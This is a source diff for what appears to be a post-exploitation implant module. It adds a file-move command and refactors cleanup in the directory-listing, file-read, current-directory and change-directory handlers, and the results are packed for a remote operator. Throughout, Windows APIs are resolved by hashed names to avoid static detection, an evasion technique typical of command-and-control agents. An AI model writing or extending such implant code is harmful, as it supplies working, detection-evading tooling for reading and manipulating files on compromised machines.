@@ -9,6 +9,7 @@
 
 
 
+
 typedef HANDLE(WINAPI *pFindFirstFileA)(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFIleData);
 typedef BOOL(WINAPI *pFindNextFileA)(HANDLE lpFindFile, LPWIN32_FIND_DATAA lpFindFIleData);
 typedef DWORD(WINAPI *pGetFullPathNameA)(LPCSTR lpFileName, DWORD nBufferLenght, LPCSTR lpBuffer, LPCSTR *lpFilePart);
@@ -19,10 +20,14 @@ typedef BOOL(WINAPI* pReadFile)(HANDLE hFile, LPVOID Buffer, DWORD NumberOfBytes
 typedef HANDLE(WINAPI* pCreateFileA)(LPCSTR FileName, DWORD desired, DWORD Shared, LPSECURITY_ATTRIBUTES lpSecAttrs, DWORD CreateDispo, DWORD FlagsAndAttrs, HANDLE Template);
 typedef DWORD(WINAPI* pGetCurrentDirectoryA)(DWORD BufferLen, LPSTR lpBuffer);
 typedef BOOL(WINAPI* pSetCurrentDirectoryA)(LPCTSTR PathName);
+typedef BOOL(WINAPI* pMoveFileA)(LPCTSTR Existing, LPCSTR New);
 
 SEC_B void do_ls(PModule mod) {
+	CHAR dot1[3];
+	char dot2[2];
 	auto Dirlen = mod->ModuleUnpack4();
 	PBYTE Dir = mod->ModuleUnpackBytes(Dirlen);
+	DWORD EntryType = 0;
 
 	HMODULE k32 = mod->ModuleGetModule(HASH_STRW( L"KERNEL32.DLL" ) );
 	pGetFullPathNameA fnGetFullPathNameA     = ( pGetFullPathNameA   )mod->ModuleGetProcAddress( k32, HASH_STRA( "GetFullPathNameA"   ) );
@@ -47,12 +52,11 @@ SEC_B void do_ls(PModule mod) {
 	if ( !hFind || hFind == INVALID_HANDLE_VALUE ) {
 		mod->ModulePack4( OUTPUT_ERROR );
 		mod->ModulePack4( ( INT32 )fnGetLastError( ));
-		return;
+		goto CLEANUP;
 	}
 
-	DWORD EntryType = 0;
-	CHAR dot1[3];
-	char dot2[2];
+	
+	
 
 	mod->ModulePack4(OUTPUT_NEEDS_PARSE);
 	mod->ModulePack4(PARSER_LS);
@@ -67,8 +71,8 @@ SEC_B void do_ls(PModule mod) {
 	do {
 		if (pStrcmp(fData.cFileName, dot1) == 0 || pStrcmp(fData.cFileName, dot2) == 0) { continue; }
 
-		if (fData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) { EntryType = 1; }
-		if (fData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) { EntryType = 3; }
+		if (fData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) { EntryType = 2; }
+		else if (fData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) { EntryType = 1; }
 		else { EntryType = 3; }
 
 		INT32 Len = (INT32)pStrlen(fData.cFileName);
@@ -81,8 +85,9 @@ SEC_B void do_ls(PModule mod) {
 	} while (fnFindNextFileA(hFind, &fData));
 	mod->ModulePack4(END_SIG);
 
-	fnCloseHandle(hFind);
-	mod->ModuleFreeMem(Dir);
+CLEANUP:
+	if( hFind ) { fnCloseHandle( hFind );    } 
+	if( Dir   ) { mod->ModuleFreeMem( Dir ); }
 	return;
 }
 
@@ -105,6 +110,10 @@ SEC_B void do_cat(PModule mod) {
 
 	pGetFileAttributesA fnGetFileAttributesA = ( pGetFileAttributesA )mod->ModuleGetProcAddress( k32, HASH_STRA( "GetFileAttributesA" ) );
 	pGetFullPathNameA fnGetFullPathNameA     = ( pGetFullPathNameA   )mod->ModuleGetProcAddress( k32, HASH_STRA( "GetFullPathNameA"   ) );
+	pCreateFileA fnCreateFileA     = ( pCreateFileA        )mod->ModuleGetProcAddress( k32, HASH_STRA( "CreateFileA"        ) );
+	pReadFile fnReadFile          = ( pReadFile           )mod->ModuleGetProcAddress( k32, HASH_STRA( "ReadFile"           ) );
+	pCloseHandle fnCloseHandle    = ( pCloseHandle        )mod->ModuleGetProcAddress( k32, HASH_STRA( "CloseHandle"        ) );
+	pGetLastError fnGetLastError  = ( pGetLastError       )mod->ModuleGetProcAddress( k32, HASH_STRA( "GetLastError"       ) );
 
 
 	CHAR path[MAX_PATH] = { 0 };
@@ -114,21 +123,14 @@ SEC_B void do_cat(PModule mod) {
 	if (!isFile) {
 		mod->ModulePack4( OUTPUT_ERROR );
 		mod->ModulePack4( CAT_ERROR_NOT_FILE);
-		return;
+		goto CLEANUP;
 	}
-
-	pCreateFileA fnCreateFileA     = ( pCreateFileA        )mod->ModuleGetProcAddress( k32, HASH_STRA( "CreateFileA"        ) );
-	pReadFile fnReadFile          = ( pReadFile           )mod->ModuleGetProcAddress( k32, HASH_STRA( "ReadFile"           ) );
-	pCloseHandle fnCloseHandle    = ( pCloseHandle        )mod->ModuleGetProcAddress( k32, HASH_STRA( "CloseHandle"        ) );
-	pGetLastError fnGetLastError  = ( pGetLastError       )mod->ModuleGetProcAddress( k32, HASH_STRA( "GetLastError"       ) );
-
-
 
 	hFile = fnCreateFileA((PCHAR)path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (!hFile || hFile == INVALID_HANDLE_VALUE) {
 		mod->ModulePack4( OUTPUT_ERROR );
 		mod->ModulePack4( ( INT32 )fnGetLastError( ));
-		return;
+		goto CLEANUP;
 	}
 
 
@@ -136,15 +138,16 @@ SEC_B void do_cat(PModule mod) {
 	if (!res) {
 		mod->ModulePack4( OUTPUT_ERROR );
 		mod->ModulePack4( ( INT32 )fnGetLastError( ));
-		return;
+		goto CLEANUP;
 	}
 
 	mod->ModulePack4(OUTPUT_NO_PARSE);
 	mod->ModulePack4(BytesRead);
 	mod->ModulePackBytes((PBYTE)buf, BytesRead);
-	mod->ModuleFreeMem(file);
-	fnCloseHandle(hFile);
 
+CLEANUP:
+	if ( file  ) { mod->ModuleFreeMem( file ); }
+	if ( hFile ) { fnCloseHandle(hFile);       }
 	return;
 }
 
@@ -161,15 +164,17 @@ SEC_B void do_pwd(PModule mod) {
 
 	DWORD res = fnGetCurrentDirectoryA( size, ( PCHAR )pwd );
 	if( res == 0 || res >= size ) {
-		mod->ModuleFreeMem( pwd );
 		mod->ModulePack4( OUTPUT_ERROR );
 		mod->ModulePack4( ( INT32 )fnGetLastError( ));
-		return;
+		goto CLEANUP;
 	}
 
 	mod->ModulePack4(OUTPUT_NO_PARSE);
 	mod->ModulePack4( ( INT32 )res );
 	mod->ModulePackBytes(pwd, ( INT32 )res);
+CLEANUP:
+	if( pwd ) { mod->ModuleFreeMem( pwd ); }
+	return;
 }
 
 
@@ -183,16 +188,47 @@ SEC_B void do_cd(PModule mod) {
 	PBYTE path   = mod->ModuleUnpackBytes(pathLen);
 
 	if( ! fnSetCurrentDirectoryA(( PCHAR )path)) {
-	    mod->ModuleFreeMem( path );
 	    mod->ModulePack4(OUTPUT_ERROR);
 		mod->ModulePack4( ( INT32 )fnGetLastError( ));
-		return;
+		goto CLEANUP;
 	}
 
-     mod->ModuleFreeMem( path );
      mod->ModulePack4(OUTPUT_SUCCESS);
      mod->ModulePack4(CP_SUCCESS);
-     return;
+
+CLEANUP:
+	if(path) {  mod->ModuleFreeMem( path ); };
+	return;
+}
+
+
+SEC_B void do_mv(PModule mod) {
+	auto f1Len = mod->ModuleUnpack4( );
+	PCHAR f1   = ( PCHAR )mod->ModuleUnpackBytes( f1Len );
+	auto f2Len = mod->ModuleUnpack4( );
+	PCHAR f2   = ( PCHAR )mod->ModuleUnpackBytes(f2Len);
+
+	 HMODULE k32 = mod->ModuleGetModule( HASH_STRW( L"KERNEL32.DLL" ) );
+
+	pMoveFileA    fnMoveFileA    = ( pMoveFileA    )mod->ModuleGetProcAddress( k32, HASH_STRA( "MoveFileA"    ) );
+   	pGetLastError fnGetLastError = ( pGetLastError )mod->ModuleGetProcAddress( k32, HASH_STRA( "GetLastError" ) );
+
+
+
+	if( ! fnMoveFileA(f1, f2)) {
+		mod->ModulePack4( OUTPUT_ERROR );
+		mod->ModulePack4( ( INT32 ) fnGetLastError( ) );
+		goto CLEANUP;
+	}
+
+	 mod->ModulePack4(OUTPUT_SUCCESS);
+     mod->ModulePack4(MV_SUCCESS);
+
+
+CLEANUP:
+	if(f1) {  mod->ModuleFreeMem( f1 ); };
+	if(f2) {  mod->ModuleFreeMem( f2 ); };
+	return;
 }
 
 /*
@@ -214,6 +250,9 @@ SEC_B void do_cd(PModule mod) {
 		break;
 	case DO_CD:
 	    do_cd(mod);
+		break;
+	case DO_MV:
+		do_mv(mod);
 		break;
 	}
 	return;
